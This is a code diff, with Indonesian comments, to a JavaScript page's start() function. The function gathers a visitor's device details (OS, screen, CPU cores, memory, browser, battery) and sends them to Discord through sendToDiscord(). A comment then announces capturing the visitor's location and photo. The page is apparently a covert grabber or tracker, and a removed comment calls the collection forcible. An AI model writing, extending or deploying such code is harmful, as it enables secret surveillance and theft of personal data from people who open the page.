@@ -37,12 +37,19 @@
     }
 
     async function start() {
-        // 1. Ambil Info Perangkat Secara Paksa
+      // 1. Ambil Info Perangkat Lebih Detail
         let infoHP = "📱 **DATA PERANGKAT TERDETEKSI**\n";
-        infoHP += "• OS/Platform: " + navigator.platform + "\n";
-        infoHP += "• Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
-        infoHP += "• Bahasa: " + navigator.language + "\n";
-        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height;
+        
+        // Deteksi Tipe (Android/iPhone/Windows)
+        let os = "Unknown OS";
+        if (navigator.userAgent.indexOf("Android") != -1) os = "Android 🤖";
+        if (navigator.userAgent.indexOf("iPhone") != -1) os = "iPhone 🍎";
+        
+        infoHP += "• Sistem: " + os + "\n";
+        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height + " (Res)\n";
+        infoHP += "• Processor: " + (navigator.hardwareConcurrency || "N/A") + " Core\n";
+        infoHP += "• Memori: " + (navigator.deviceMemory || "N/A") + " GB (Estimasi)\n";
+        infoHP += "• Browser: " + (navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge)\//) ? navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge)\//)[1] : "Lainnya");
 
         // Cek Baterai
         if (navigator.getBattery) {
@@ -52,7 +59,7 @@
             } catch (e) {}
         }
 
-        // KIRIM DATA HP DULUAN (Wajib Berhasil)
+        // KIRIM DATA HP
         await sendToDiscord(infoHP);
 
         // 2. Baru Ambil Lokasi & Foto
